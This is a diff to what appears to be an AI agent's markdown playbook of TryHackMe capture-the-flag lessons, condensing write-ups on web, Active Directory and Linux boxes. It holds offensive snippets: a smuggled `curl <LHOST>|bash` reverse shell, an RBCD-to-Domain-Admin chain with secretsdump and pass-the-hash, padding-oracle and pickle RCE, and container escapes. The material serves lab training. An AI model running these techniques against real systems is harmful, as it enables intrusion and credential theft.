@@ -193,86 +193,41 @@ Then walk the manual checklist (do not skip any; the box's intended path is usua
 | Creds | configs, history, DB, `.ssh`, backups | reuse / su |
 | Kernel/pkg CVE | `uname -r`; pkg versions (pkexec/polkit, sudo, dbus) | **LAST resort** - check the patch level first (see lesson) |
 
-## Lesson: mutate leaked/labelled secrets; cookie-BFLA is not session admin (THM Support Panel)
-
-A PHP panel that leaked its own source via an LFI (`readfile`/`highlight_file` of `?skin=../config`):
-- **A labelled secret that fails as a literal is a SEED, not always a decoy.** Source leaked
-  `$MASTER_PASSWORD='support@110'`; it failed on every login/SSH. The admin's real password was a
-  **mutation**: `support@110` -> `support110` (drop the `@`). Mutate leaked/hint values
-  (`echo '<seed>' | hashcat --stdout -r best64.rule`, plus manual case/number/suffix/`@`-drop)
-  against the real login BEFORE declaring decoy or committing to a full rockyou brute (which gave a
-  misleading ~40h ETA and never would have hit it). See [[password-cracking]].
-- **A forgeable cookie usually gates only PART of the app.** `isITUser=md5(user.admin?"true":"false")`
-  forged to `md5("true")` unlocked the API + IDOR, but the RCE and the flag were gated by
-  `$_SESSION['admin']`, set ONLY at a real login. The cookie BFLA was a deliberate distraction.
-  Map WHICH check (cookie vs session) gates the thing you actually want before assuming "I'm admin".
+## Lesson: mutate leaked/labelled secrets; cookie-BFLA != session admin (THM Support Panel)
+- **A labelled secret that fails as a literal is a SEED, not always a decoy:** mutate it (`echo '<seed>' | hashcat --stdout -r best64.rule` + manual case/number/suffix/`@`-drop) against the real login BEFORE declaring decoy or committing to a full rockyou brute (e.g. `support@110` -> `support110`). See [[password-cracking]].
+- **A forgeable cookie usually gates only PART of the app:** an `md5("true")` cookie unlocked an API + IDOR while the RCE + flag stayed behind `$_SESSION['admin']` (set only at real login). Map WHICH check (cookie vs session) gates the thing you want before assuming "I'm admin".
 - Command sink behind a prefix allowlist (`strpos($cmd,'date')===0`) -> chain off it: `date;<cmd>`.
 
 ## Lesson: reverse-proxy smuggling chain + go-for-shell efficiency (THM Contrabando)
+- **Fuzz BEHIND the proxy** (`ffuf -u http://T/page/FUZZ -e .php`) to find sinks the proxy never routes externally, before reading source.
+- **CVE-2023-25690** (Apache <=2.4.55 `RewriteRule [P]`): raw `%0d%0a` in the captured path splits the proxied request -> smuggle a POST to a cmd-injection sink. Exact bytes/gotchas (leading `x`, `%20` ends the request line, `&`->`%26`) in [[http-request-smuggling]].
+- **Once egress is confirmed, go STRAIGHT for a reverse shell** (`curl <LHOST>|bash`, payload at web-root so the body has no slashes); the blind-RCE-to-file + LFI-read path is only the slow no-egress fallback.
+- **No container escape (no docker.sock, CapEff=0, no host mount)? Pivot over the docker network, not out** (`rustscan 172.18.0.1,172.18.0.2` from the container).
+- **Internal "fetch a URL" service = SSRF + often SSTI** (`render_template_string` -> host a Jinja2 template for RCE; `file://` reads host files too). See [[ssti]].
+- **Privesc:** sudo `python*` arg-glob -> python2 `input()`=`eval()`; an unquoted `[[ == ]]` script is a glob oracle leaking the sudo password. See [[linux-privesc]].
+- **Orchestration:** if you delegate a box to a background fork, do NOT also exploit it in parallel (a long brute makes the fork look idle while alive); wait for its completion signal or `SendMessage`-ping.
 
-Front Apache proxies `/page/(.*)` to a backend; the chain plus the efficiency mistakes worth not repeating:
-- **Fuzz behind the proxy.** `ffuf -u http://T/page/FUZZ -e .php -fw <readfile-error-wc>` found `gen.php`, a sink the proxy never routes externally. Find the unrouted endpoint BEFORE reading source.
-- **CVE-2023-25690** (Apache <= 2.4.55 `RewriteRule [P]`): raw `%0d%0a` in the captured path splits the proxied request, smuggling a POST to that cmd-injection sink. Exact bytes + gotchas (leading `x`, `%20` ends the request line, `&`->`%26`, exact CL) in [[http-request-smuggling]].
-- **Once egress is confirmed, go straight for a reverse shell:** smuggle `length=;curl <LHOST>|bash;` with the payload at web-root `index.html` so the body has NO slashes (dodges the front's literal-`/` 404 and all double-encoding). Do NOT grind blind-RCE-to-file + LFI-read; a real shell makes the downstream brute-force and the python2 trick trivial. The blind `id>%252ftmp%252fo` + LFI-read path is only the no-egress fallback (slow, racy, truncates long commands; for those host a script and smuggle the short `curl <IP>|bash`).
-- **No container escape (no docker.sock, CapEff=0, no host mount)? Pivot over the docker network, not out of the container.** `rustscan --top -a 172.18.0.1,172.18.0.2 --accessible` from the container found an internal Flask app on `172.18.0.1:5000`.
-- **Internal "fetch a URL" service = SSRF + often SSTI.** It rendered the fetched response via `render_template_string`, so host a Jinja2 template, `website_url=http://<LHOST>/t`, RCE as the app user; `file://` also reads host files. See [[ssti]].
-- **Privesc:** sudo `python*` arg-glob picks python2 -> `input()`=`eval()`; an unquoted `[[ == ]]` vault script is a glob oracle leaking the sudo password. See [[linux-privesc]].
-- **Orchestration:** if you delegate this box to a background fork, do NOT also exploit it in parallel. A long brute-force makes the fork look idle while it is alive; shared `/tmp` files + app render-caches make your runs and the fork's indistinguishable. Wait for the completion signal or `SendMessage`-ping.
-
-## Lesson: Windows AD box, RDP-only foothold -> KeePass (DPAPI) -> RBCD to DA (THM Forward)
-
-Assumed-breach low-priv domain user; DA via a credential chain (no Linux, no memory-CVE). Load `Skill(hunt-ad)`.
-- **RDP-only foothold.** User in **Remote Desktop Users** but NOT local-admin and no WinRM = interactive RDP is
-  the only exec path. Drive it HEADLESS from Kali: `Xvfb :99 &` + `DISPLAY=:99 xfreerdp3 /v: /u: /p: /d: /cert:ignore
-  /drive:sh,/tmp/share` (FreeRDP 3.x wants `/cert:ignore`, NOT `/cert-ignore`) + `xdotool key super+r` then type
-  `cmd /c \\tsclient\sh\run.bat`, with output redirected to the `\\tsclient\sh` drive. Read GUI secrets by SCREENSHOT
-  (`import -window root`); the headless clipboard is unreliable (syncs 1 byte). Full recipe in [[ad-lateral-movement]].
-- **AppLocker-Restricted user:** a dropped .exe (winPEAS/SharpUp) is blocked - enumerate with built-ins
-  (reg/sc/wmic/schtasks/dir), which run from the allowed C:\Windows.
-- **KeePass DB (`*.kdbx`) on the box:** if `keepass2john`/pykeepass reject EVERY password, it is not password-locked.
-  Check `KeePass.config.xml` KeySources - `<UserAccount>true</UserAccount>` = protected by the **Windows account
-  (DPAPI), uncrackable offline**. OPEN it on the box as that user (only "Windows user account" ticked -> OK). Creds
-  inside often **REUSE** to a higher-priv account - spray them. See [[password-cracking]].
-- **RBCD to DA** once you own an account with `AddAllowedToAct`/GenericWrite on a computer (BloodHound): `addcomputer
-  FAKE$` (MAQ>0) -> `rbcd -action write` -> `getST -impersonate Administrator -spn cifs/DC` -> `secretsdump -k`.
-- **Reading the flag as DA:** Defender may block `nxc -x`/wmiexec output retrieval - read files directly over SMB with
-  PtH (`smbclient //DC/C$ -U DOM/Administrator --pw-nt-hash <hash> -c 'get <path>'`); no exec = no AV.
+## Lesson: Windows AD, RDP-only foothold -> KeePass (DPAPI) -> RBCD to DA (THM Forward)
+Load `Skill(hunt-ad)`. Assumed-breach low-priv user; DA via a credential chain (no memory CVE).
+- **RDP-only exec** (in Remote Desktop Users, not local-admin, no WinRM): drive it HEADLESS from Kali - `Xvfb :99 &` + `DISPLAY=:99 xfreerdp3 /v: /u: /p: /cert:ignore /drive:sh,/tmp/share` (3.x wants `/cert:ignore`) + `xdotool key super+r` -> `cmd /c \\tsclient\sh\run.bat`, output to the mapped drive; read GUI secrets by screenshot (`import -window root`). Recipe in [[ad-lateral-movement]].
+- **AppLocker-restricted:** a dropped .exe (winPEAS/SharpUp) is blocked -> enumerate with built-ins (reg/sc/wmic/schtasks/dir) from C:\Windows.
+- **KeePass `.kdbx` that rejects every password** may be DPAPI-protected (`KeePass.config.xml` `<UserAccount>true` = uncrackable offline): OPEN it on the box as that user; creds inside often REUSE to higher-priv - spray. See [[password-cracking]].
+- **RBCD to DA** with `AddAllowedToAct`/GenericWrite on a computer (BloodHound): `addcomputer FAKE$` (MAQ>0) -> `rbcd -action write` -> `getST -impersonate Administrator -spn cifs/DC` -> `secretsdump -k`.
+- **Read the flag as DA** with no exec (Defender blocks `-x`/wmiexec): `smbclient //DC/C$ -U DOM/Administrator --pw-nt-hash <hash> -c 'get <path>'`.
 
 
 ## Lesson: crypto-app chain -> invite forge -> padding-oracle RCE (THM Decryptify)
-
-PHP web app on a high port; no memory CVE, the whole box is applied crypto. Load `Skill(hunt-sqli)`/wiki [[cryptography-attacks]].
-- **Deobfuscate client JS for secrets.** obfuscator.io-style `api.js` (string-array + rotator) hides an API
-  password/key. Don't hand-trace: run the decoder in node -- `node -e "$(cat api.js); console.log(c)"` prints
-  the decoded `const`. It gated `api.php`, whose "docs" leaked the token algorithm.
-- **Directory listing is the crack.** ffuf found `/logs/` (autoindex) -> `app.log` leaked a valid
-  (email, invite_code) pair, the email domain, and which users are active. That one pair breaks the token scheme.
-- **Weak `mt_rand` token forge from ONE pair.** Token = `mt_srand(seed(email,CONST)); base64(mt_rand())`. Recover
-  the unknown `CONST` offline by bruting until the leaked pair reproduces (PHP 8 cli replicates a PHP 7.x target;
-  `mt_rand` is stable 7.1+), then forge any user's code -> login. See [[cryptography-attacks]] PRNG.
-- **Encrypted param -> padding-oracle RCE.** A hidden `?date=` blob, re-encrypted each load, decrypted server-side
-  and its value RUN as a shell command (output echoed in the footer). The openssl error leaked an **8-byte IV = 64-bit
-  cipher, NOT AES** (stop guessing AES keys). App showed a distinct "Padding error" vs clean render = **padding oracle**.
-  No padbuster on the VM -> ~60-line Python oracle: decrypt the blob (plaintext was literally `date +%Y` -> confirms the
-  `shell_exec` sink), then **CBC-R forge** a blob decrypting to `cat /home/ubuntu/flag.txt` -> RCE, no key. `THM{GOT_COMMAND_EXECUTION001}`.
-- **Anti-grind:** guessing the cipher KEY was a dead-end (~130 combos); the padding oracle needs NO key. When an app
-  echoes padding validity, reach for the oracle, don't brute keys. Forging (CBC-R) is the payload, not just decryption.
+Load `Skill(hunt-sqli)`/[[cryptography-attacks]]. Whole box is applied crypto, no memory CVE.
+- **Deobfuscate client JS in node** (`node -e "$(cat api.js); console.log(c)"`) to print hidden API keys/algorithms, don't hand-trace.
+- **Directory listing (autoindex) is the crack:** ffuf `/logs/` -> `app.log` leaked a valid (email, invite_code) pair that breaks the token scheme.
+- **Weak `mt_rand` token forge from ONE pair:** recover the unknown seed `CONST` offline by bruting until the leaked pair reproduces (PHP 8 cli replicates a 7.x target; `mt_rand` stable 7.1+), then forge any user's code. See [[cryptography-attacks]] PRNG.
+- **Encrypted param -> padding-oracle RCE:** an 8-byte IV = 64-bit cipher (NOT AES, stop guessing keys); a distinct "Padding error" vs clean render = padding oracle. Decrypt (a `date`-family plaintext confirms a `shell_exec` sink), then CBC-R forge a blob decrypting to your command -> RCE, no key. When an app echoes padding validity, reach for the oracle, don't brute keys.
 
 ## Lesson: cred-reuse-first, don't blind-scrape a SPA admin, linpeas-not-by-hand (THM Voyage)
-
-Joomla 4.2.7 -> CVE-2023-23752 leaked the DB root password. Chain: cred-reuse -> root SSH on a pivot
-container -> internal Flask app pickle-deser RCE -> `cap_sys_module` kmod escape to host root. Three misses:
-- **A leaked cred is a REUSE probe before it is a research target.** The DB password was reused for root
-  SSH on a second port. Test any leaked/default cred against SSH + every other auth surface FIRST; only
-  then commit to a slower web-admin exploit chain. (Rule 2 says this; the miss was ~13 calls blind-scraping
-  the admin panel before trying the obvious reuse.)
-- **Modern CMS/SPA admin panels are JS-rendered**, so `curl` sees only page chrome (no list rows/ids). Do
-  NOT grind a template-editor RCE over `curl` against a Joomla 4 / SPA admin - drive a real browser, or
-  (usually) the intended foothold is elsewhere (here: the cred reuse).
-- **Privesc = linpeas/pspy FIRST (Rule 3), not hand-rolled `ls`/`find`/`cat`.** The smell is enumerating by
-  hand before the automated sweep runs. `cap_sys_module` escape: `capsh --print | grep sys_module` then
-  build+`insmod` a module into the host (`call_usermodehelper`); if headers != running kernel, patch the
-  `.ko` vermagic to `uname -r` - see [[linux-privesc]].
+Chain: Joomla CVE-2023-23752 (leaks DB pass) -> cred-reuse to root SSH on a pivot container -> internal Flask pickle-deser RCE -> `cap_sys_module` kmod escape to host root.
+- **A leaked cred is a REUSE probe before a research target:** test it against SSH + every auth surface FIRST (the DB pass was reused for root SSH); only then commit to a slow web-admin chain.
+- **Modern CMS/SPA admin panels are JS-rendered** (`curl` sees only chrome): don't grind a template-editor RCE over curl against a Joomla 4/SPA admin - drive a browser, or the foothold is elsewhere.
+- **Privesc = linpeas/pspy FIRST, not hand-rolled `ls`/`find`/`cat`.** `cap_sys_module` escape (`capsh --print | grep sys_module`): build+`insmod` a module (`call_usermodehelper`); if headers != running kernel, patch the `.ko` vermagic to `uname -r`. See [[linux-privesc]].
 
 ## Capture (engagement discipline)
 
@@ -350,54 +305,19 @@ lists missed, e.g. `/internal`), feed the GENERIC token back so the next box is 
 `python3 scripts/wordlist-suggest.py` (leak-safe, read-only) then `scripts/wl-add.sh paths <token>`
 / `wl-add.sh params <name>`. Add only generic methodology names - never client-specific branding.
 
-## Lesson: multi-service web escape chain - media-origin BFLA, allowlist-SSRF-to-console, SUID->docker (THM HopSec Asylum)
-
-A themed multi-flag web box (flags submitted to one "escape" endpoint), owned via a chain of
-app-logic bugs, not a memory CVE. Load `Skill(hunt-idor)`/`Skill(hunt-ssrf)`/`Skill(hunt-api)`.
-- **Client-side-only auth = BAC.** A "flag" endpoint gated only by a client-side `session_check`
-  (the JS hides the button) returns the flag when hit directly. Always call the CGI/API endpoint
-  raw, never trust the UI gate.
-- **OSINT combinator password.** A fake-social app leaked an old password (`Word####$` shape) in a
-  post comment + the owner's dog name + birth year. New password = a combinator of those in the
-  same shape (`Dogname<year>!`). Build the small custom list from the OSINT, don't grind rockyou.
-- **Media-origin path BFLA.** The video API gated an admin camera, but the HLS **origin** (nginx)
-  served the same `/hls/<cam>/playlist.m3u8` with NO auth. When an API restricts a stream, test the
-  segment/origin server directly - it often skips the API's authz. (The admin feed was a CCTV
-  shoulder-surf of a keypad: `ffmpeg -vf fps=10` frames; a Goertzel detector on the ~4kHz keypad
-  beep gives the digit COUNT; read the finger position per press.)
-- **Allowlist-SSRF that mints a console token.** A manifest leaked a hidden `/v1/ingest/diagnostics`
-  endpoint (read the FULL manifest - it was in an `#EXT-X-SESSION-DATA` header). It validated the
-  `rtsp_url` host against an allowlist (`vendor-cam.test`), and the allowlisted host was a MAGIC
-  trigger that minted a token for a `socat`-backed shell on another port. Reverse the URL filter
-  (host/scheme allowlist vs userinfo/alt-loopback), and treat any "diagnostics/ingest/probe"
-  endpoint that takes a URL as an SSRF/trigger surface. See [[ssrf]].
-- **SUID-that-only-setuid + `sg`/`newgrp` to grab the group.** Privesc from a low svc account: a
-  custom SUID binary (`diag_shell`) did `setuid(other_user); execl("/bin/bash")` -> you become that
-  UID but KEEP your old groups. If that user is in `docker` (check `/etc/group`), run
-  `sg docker -c '<cmd>'` (or `newgrp docker`) to pick up the group -> docker socket -> root file
-  access (`docker run -v /:/host ...` / `docker exec` the target container). See [[linux-privesc]].
+## Lesson: multi-service web escape chain - media-origin BFLA, allowlist-SSRF, SUID->docker (THM HopSec Asylum)
+Load `Skill(hunt-idor)`/`Skill(hunt-ssrf)`/`Skill(hunt-api)`. Owned via app-logic bugs, not a memory CVE.
+- **Client-side-only auth = BAC:** a "flag" endpoint gated only by a JS `session_check` returns the flag when hit raw. Always call the CGI/API endpoint directly, never trust the UI gate.
+- **OSINT combinator password:** a fake-social app leaked an old password shape + the owner's dog name + birth year -> new password was a combinator of those in the same shape. Build the small custom list from OSINT, don't grind rockyou.
+- **Media-origin path BFLA:** the video API gated an admin camera but the HLS origin (nginx) served `/hls/<cam>/playlist.m3u8` with NO auth. When an API restricts a stream, test the segment/origin server directly.
+- **Allowlist-SSRF that mints a console token:** a hidden `/v1/ingest/diagnostics` (in an `#EXT-X-SESSION-DATA` manifest header - read the FULL manifest) validated `rtsp_url` against an allowlist whose magic host minted a shell token. Treat any "diagnostics/ingest/probe" endpoint taking a URL as an SSRF/trigger surface. See [[wiki/payloads/ssrf]].
+- **SUID-that-only-setuid + `sg`/`newgrp`:** a custom SUID doing `setuid(other);execl(bash)` gives you that UID but KEEPS your groups; if that user is in `docker`, `sg docker -c '<cmd>'` -> docker socket -> root (`docker run -v /:/host`). See [[linux-privesc]].
 
 ## Lesson: a "static template" is often a dynamic app - READ the JS end-to-end, don't grep (THM Buzz)
-
-A bootstrap game-template landing page looked like a pure static decoy; the whole box hinged on one
-thing I skipped by GREPPING instead of reading (rules a2 + d above exist for exactly this and I ignored
-them - the miss cost the entire box until a writeup showed the path).
-- **`/static/` paths + `onclick=` handlers = a Python/Flask app in disguise, not a static site.** The
-  "Game Ratings" buttons had `onclick="sendRequest('1')"`; `dropdown.js` (never opened - I read
-  custom.js, saw UI code, moved on) defined `sendRequest` as an AJAX `POST /fetch` with body
-  `{"object":"/var/upload/games/object.pkl"}`. `/static/` -> Flask -> `.pkl` -> pickle.
-- **A file-PATH-taking loader + a separate arbitrary-upload = deserialization RCE.** `/fetch` does
-  `pickle.load(open(<object>))` on the CLIENT-supplied path. The `/secret/upload/` form stores files
-  OUTSIDE the webroot (unreachable by URL - a rabbit hole if you treat it as a webshell upload); it is
-  only a DELIVERY mechanism. Upload a malicious `__reduce__` pickle, then POST `/fetch` at its path ->
-  RCE. See [[insecure-deserialization]].
-- **A grep of a page/JS is NOT a read.** Keyword greps filtered out the exact `sendRequest`/`/fetch`
-  lines. When an upload's files vanish, or a site "has no dynamic surface", the answer is usually in a
-  JS handler or a response you skimmed - open the file and read it top to bottom before concluding.
-- **Egress was L7/port-filtered:** bash `/dev/tcp` and shells to arbitrary high ports (9001) died while
-  `curl` and a python reverse shell to **443** worked. Confirm egress with a curl-callback loop over
-  candidate ports, then use an http-ish port. Root was PwnKit once the intended knockd->SSH path was
-  dead (knockd service not running on the redeploy). See [[privesc-exploit-arsenal]].
+- **`/static/` paths + `onclick=` handlers = a Flask app in disguise.** "Game Ratings" buttons had `onclick="sendRequest('1')"`; `dropdown.js` (unopened - I read custom.js and moved on) defined it as `POST /fetch {"object":"/var/upload/games/object.pkl"}` -> Flask -> pickle.
+- **A file-PATH-taking loader + a separate arbitrary-upload = deser RCE:** `/fetch` does `pickle.load(open(<client-path>))`; the `/secret/upload/` form stores files OUTSIDE the webroot (a DELIVERY mechanism, not a webshell). Upload a `__reduce__` pickle, POST `/fetch` at its path -> RCE. See [[insecure-deserialization]].
+- **A grep of a page/JS is NOT a read:** greps filtered out the exact `sendRequest`/`/fetch` lines. When an upload's files vanish or a site "has no dynamic surface", open the JS handler/response and read top-to-bottom.
+- **Egress was port-filtered:** `/dev/tcp` + shells to high ports (9001) died while curl and a python reverse shell to 443 worked. Confirm egress with a curl-callback over candidate ports, use an http-ish port. Root was PwnKit once the intended knockd->SSH path was dead. See [[privesc-exploit-arsenal]].
 
 ## Context tools
 
